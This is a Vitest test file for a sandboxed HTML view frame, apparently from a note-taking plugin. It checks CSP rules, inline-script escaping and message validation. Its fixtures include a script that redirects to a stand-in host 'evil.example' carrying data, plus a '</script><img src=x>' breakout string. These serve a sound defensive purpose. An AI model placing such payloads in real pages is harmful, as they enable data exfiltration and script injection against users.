import { describe, expect, it } from "vitest";
import {
	AUTO_HEIGHT_CSS,
	buildThemeCss,
	buildViewFrameSrcdoc,
	buildViewSrcdoc,
	escapeInlineScript,
	OUTER_FRAME_CSP,
	OUTER_RELAY_SCRIPT,
	parseFrameMessage,
	VIEW_CSP,
	VIEW_FRAME_PADDING_PX,
	VIEW_RUNTIME_SCRIPT,
} from "../../src/genview/viewFrame";

describe("buildThemeCss", () => {
	it("copies only variables that resolve and records the colour scheme", () => {
		const values: Record<string, string> = { "--text-normal": " #eee ", "--interactive-accent": "#7c3aed" };
		const css = buildThemeCss((name) => values[name] ?? "", true);
		expect(css.startsWith(":root { color-scheme: dark; ")).toBe(true);
		expect(css).toContain("--text-normal: #eee;");
		expect(css).toContain("--interactive-accent: #7c3aed;");
		expect(css).not.toContain("--background-primary");
	});
});

describe("buildViewSrcdoc (inner document)", () => {
	it("locks the document down with a CSP and installs the runtime before the body", () => {
		const doc = buildViewSrcdoc("<p id=x>hi</p>", ":root { --a: b; }");
		expect(doc).toContain(`<meta http-equiv="Content-Security-Policy" content="${VIEW_CSP}">`);
		expect(doc).toContain('<meta http-equiv="x-dns-prefetch-control" content="off">');
		expect(doc).toContain('<style id="s2b-theme">:root { --a: b; }</style>');
		expect(doc.indexOf(VIEW_RUNTIME_SCRIPT)).toBeLessThan(doc.indexOf("<p id=x>hi</p>"));
	});

	it("blocks every network source, form submission and base override", () => {
		expect(VIEW_CSP).toContain("default-src 'none'");
		expect(VIEW_CSP).toContain("form-action 'none'");
		expect(VIEW_CSP).toContain("base-uri 'none'");
		expect(VIEW_CSP).not.toMatch(/https?:/);
		expect(VIEW_CSP).not.toContain("connect-src");
	});

	it("keeps the runtime free of template placeholders and script terminators", () => {
		expect(VIEW_RUNTIME_SCRIPT).not.toContain("${");
		expect(VIEW_RUNTIME_SCRIPT).not.toContain("</script");
	});

	it("forces html/body to content height only in auto-height mode", () => {
		expect(buildViewSrcdoc("x", "")).toContain(AUTO_HEIGHT_CSS);
		expect(buildViewSrcdoc("x", "", [], false)).not.toContain(AUTO_HEIGHT_CSS);
		expect(buildViewFrameSrcdoc("x", "", [], false)).not.toContain("min-height: 0 !important");
	});

	it("inlines requested libraries between the runtime and the body, escaped for inline script", () => {
		const lib = 'window.LIB = 1; const s = "</script><img src=x>"; /* </SCRIPT */';
		const doc = buildViewSrcdoc("<p id=x>hi</p>", "", [lib]);
		expect(doc).toContain(`<script>${escapeInlineScript(lib)}</script>`);
		expect(doc.indexOf(VIEW_RUNTIME_SCRIPT)).toBeLessThan(doc.indexOf("window.LIB = 1"));
		expect(doc.indexOf("window.LIB = 1")).toBeLessThan(doc.indexOf("<p id=x>hi</p>"));
		// Every </script> in the document must close a script we opened: runtime + lib.
		expect(doc.split("</script>")).toHaveLength(3);
		expect(buildViewSrcdoc("x", "")).not.toContain("<script></script>");
	});

	it("reports ready from the load event, after the document itself has loaded", () => {
		const loadHandler = VIEW_RUNTIME_SCRIPT.indexOf('window.addEventListener("load"');
		const ready = VIEW_RUNTIME_SCRIPT.indexOf('send({ type: "ready" })');
		expect(loadHandler).toBeGreaterThan(-1);
		expect(ready).toBeGreaterThan(loadHandler);
	});
});

describe("buildViewFrameSrcdoc (outer relay document)", () => {
	const body = '<script>location.href = "https://evil.example/?d=1";</script><p>x</p>';
	const outer = buildViewFrameSrcdoc(body, ":root { --a: b; }");

	it("pads the view from the card edge in the trusted document", () => {
		expect(outer).toContain(`padding: ${VIEW_FRAME_PADDING_PX}px`);
		// The inner body carries no padding of its own (only the margin/padding reset).
		expect(buildViewSrcdoc("x", "")).not.toContain("padding: var(");
	});

	it("forbids the inner frame from navigating anywhere", () => {
		expect(outer).toContain(`<meta http-equiv="Content-Security-Policy" content="${OUTER_FRAME_CSP}">`);
		expect(OUTER_FRAME_CSP).toContain("frame-src 'none'");
	});

	it("embeds the inner document as a script literal that cannot close the outer script", () => {
		// The outer document has exactly one <script> block, so exactly one terminator —
		// every </script> inside the embedded inner document must be escaped.
		expect(outer.split("</script>")).toHaveLength(2);
		expect(outer).toContain('const INNER = "');
		expect(outer).toContain("\\u003c/script>");
		expect(outer).toContain(OUTER_RELAY_SCRIPT);
	});

	it("round-trips the inner document, libraries included, through the literal", () => {
		const withLib = buildViewFrameSrcdoc(body, ":root { --a: b; }", ["window.LIB = '</script>';"]);
		const match = /const INNER = ("(?:[^"\\]|\\.)*");/.exec(withLib);
		expect(match).not.toBeNull();
		expect(JSON.parse(match?.[1] ?? '""')).toBe(
			buildViewSrcdoc(body, ":root { --a: b; }", ["window.LIB = '</script>';"]),
		);
		expect(withLib.split("</script>")).toHaveLength(2);
	});

	it("keeps the relay free of template placeholders", () => {
		expect(OUTER_RELAY_SCRIPT).not.toContain("${");
		expect(OUTER_RELAY_SCRIPT).not.toContain("</script");
	});
});

describe("parseFrameMessage", () => {
	it("accepts the frame messages", () => {
		expect(parseFrameMessage({ s2bView: true, type: "ready" })).toEqual({ type: "ready" });
		expect(parseFrameMessage({ s2bView: true, type: "requery" })).toEqual({ type: "requery" });
		expect(parseFrameMessage({ s2bView: true, type: "navigated" })).toEqual({ type: "navigated" });
		expect(parseFrameMessage({ s2bView: true, type: "resize", height: 240.5, extent: 180 })).toEqual({
			type: "resize",
			height: 240.5,
			extent: 180,
		});
		// A missing or malformed extent falls back to the height rather than dropping the message.
		expect(parseFrameMessage({ s2bView: true, type: "resize", height: 240 })).toEqual({
			type: "resize",
			height: 240,
			extent: 240,
		});
		expect(parseFrameMessage({ s2bView: true, type: "open-note", path: "a/b.md" })).toEqual({
			type: "open-note",
			path: "a/b.md",
		});
	});

	it("drops untagged, unknown or malformed messages", () => {
		expect(parseFrameMessage({ type: "ready" })).toBeNull();
		expect(parseFrameMessage({ s2bView: true, type: "eval", code: "x" })).toBeNull();
		expect(parseFrameMessage({ s2bView: true, type: "resize", height: "big" })).toBeNull();
		expect(parseFrameMessage({ s2bView: true, type: "resize", height: Number.NaN })).toBeNull();
		expect(parseFrameMessage({ s2bView: true, type: "open-note", path: "" })).toBeNull();
		expect(parseFrameMessage("ready")).toBeNull();
		expect(parseFrameMessage(null)).toBeNull();
	});
});
